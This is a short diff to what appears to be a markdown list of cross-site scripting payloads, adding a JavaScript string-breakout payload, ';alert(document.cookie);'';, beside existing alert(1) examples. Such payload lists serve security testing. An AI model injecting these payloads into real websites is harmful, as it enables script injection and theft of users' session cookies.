@@ -179,6 +179,9 @@ xss';alert(1);'xss
 ```javascript
 '-alert(1)-'
 ```
+```javascript
+';alert(document.cookie);'';
+```
 
 ---
 
